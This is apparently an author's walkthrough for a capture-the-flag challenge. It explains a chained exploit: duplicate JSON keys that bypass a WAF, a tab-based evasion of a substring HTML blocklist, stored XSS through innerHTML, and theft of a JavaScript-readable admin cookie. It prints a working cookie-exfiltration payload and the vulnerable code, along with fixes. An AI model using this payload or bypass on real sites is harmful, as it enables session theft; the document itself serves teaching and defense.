# Doppelganger — Author Walkthrough

This document is for the challenge author, mentor, or reviewer. It explains
the intended exploit, the source-code causes, and the mitigations. Do not give
this file to players before the event.

## Objective

The player submits a note that:

1. Passes the first validation layer.
2. Stores browser-interpreted HTML in the notes database.
3. Executes when the private admin bot reviews the notes.
4. Reads the administrator's JavaScript-accessible cookie.
5. Sends the cookie to the player's inbox.

The cookie contains the flag:

```text
admin_session=<flag>
```

## Architecture

```text
Player browser
      |
      | JSON note submission
      v
Python Flask application
      |
      | WAF validation
      | Backend parsing and blocklist
      v
SQLite notes database
      |
      | Periodic admin review
      v
Node.js Playwright bot
      |
      | Opens admin dashboard
      | Receives admin cookie
      | Renders note as HTML
      v
Stored JavaScript executes
      |
      | Sends document.cookie
      v
/api/collect/<token>  ->  /api/solved
```

## Intended payload

The canonical payload uses one tab after `svg` and an ordinary space before
the equals sign:

```json
{"content":"normal note","content":"<svg\tonload =fetch('/api/collect/local-player?c='+encodeURIComponent(document.cookie))>"}
```

The `\t` sequence is two characters in the raw JSON request. JSON decoding
turns it into a tab before the application stores the content. Replace
`local-player` with the inbox token shown on the page if it differs.

## Vulnerability 1: duplicate JSON keys

The WAF uses an ordered-pair parser:

```python
pairs = json.loads(raw_body, object_pairs_hook=lambda items: items)
```

This preserves duplicate members. The WAF checks the first `content` value.

The backend later uses a normal parser:

```python
data = json.loads(raw_body)
content = data["content"]
```

For duplicate keys, the normal Python parser keeps the last value.

Therefore, the same request is interpreted as:

```text
WAF sees       -> normal note
Backend sees   -> malicious HTML
```

The input is not rejected because the harmless first value satisfies the WAF,
while the malicious second value becomes the stored note.

### Known technique and resources

Duplicate JSON parameters are commonly called duplicate JSON keys or duplicate
JSON member names. They are a known parser-differential technique, not a
unique invention of this challenge.

The primary reference is [RFC 8259, Section 4](https://www.rfc-editor.org/rfc/rfc8259.html#section-4).
It says that object names should be unique and explains that implementations
may behave differently when names are duplicated.

For a deeper security explanation, see the LangSec paper
[Parser Differentials and Security](https://langsec.org/spw23/papers/Ali_LangSec23.pdf).

## Vulnerability 2: incomplete HTML blocklist

The application checks literal strings:

```python
if f"<{tag} " in lowered:
    return None

if f"{event}=" in lowered:
    return None
```

This is not an HTML parser. It only recognizes a literal space after the tag
name and a literal equals sign immediately after the event name.

The payload contains:

```html
<svg	onload =fetch(...)>
```

The application does not find:

```text
<svg 
onload=
```

The browser still accepts the markup because HTML treats the tab and space as
valid whitespace.

## Vulnerability 3: stored XSS

The admin template renders stored note content with:

```javascript
article.innerHTML = note.content;
```

This is the direct stored-XSS sink. The note is attacker-controlled, but
`innerHTML` tells the browser to parse it as markup.

When the admin bot opens the dashboard, the SVG element is inserted and its
`onload` handler executes.

## Vulnerability 4: readable administrator cookie

The server sets the admin cookie using:

```python
response.set_cookie("admin_session", FLAG, httponly=False, samesite="Lax")
```

Because `httponly=False`, page JavaScript can read `document.cookie`. The
payload sends that value to the same-origin inbox, where the player reads it
from `/api/solved`.

## What happened and why

The exploit is a chain, not one isolated bug:

1. Duplicate JSON keys make the WAF and backend use different values.
2. The blocklist uses substring matching instead of HTML parsing.
3. Tab and space variations bypass the exact checks.
4. The stored content is inserted with `innerHTML`.
5. The admin bot uses a real browser, so the event handler executes.
6. The cookie contains the flag and is readable by JavaScript.
7. The inbox receives the administrator session value.

If any one of these links is removed, the intended exploit fails.

## How to fix it

### Reject duplicate keys

Use one strict parser for both validation and application logic:

```python
def reject_duplicates(pairs):
    result = {}
    for key, value in pairs:
        if key in result:
            raise ValueError("duplicate JSON key")
        result[key] = value
    return result

data = json.loads(raw_body, object_pairs_hook=reject_duplicates)
```

### Do not use a string blacklist for HTML

For plain notes, render text:

```javascript
article.textContent = note.content;
```

If HTML is required, use a maintained sanitizer with a strict allowlist. Do
not attempt to secure HTML with a collection of substring checks.

### Protect cookies

Use an opaque random session identifier, not the flag, and set:

```python
response.set_cookie(
    "admin_session",
    session_id,
    httponly=True,
    secure=True,
    samesite="Strict",
)
```

`HttpOnly` prevents JavaScript from reading the cookie through
`document.cookie`.

### Add defense in depth

Use a restrictive Content Security Policy:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'
```

## Final security lesson

Validation must use the same parsing rules as the application. Untrusted note
content must not be inserted into `innerHTML`, and sensitive values must not be
placed in JavaScript-readable cookies.
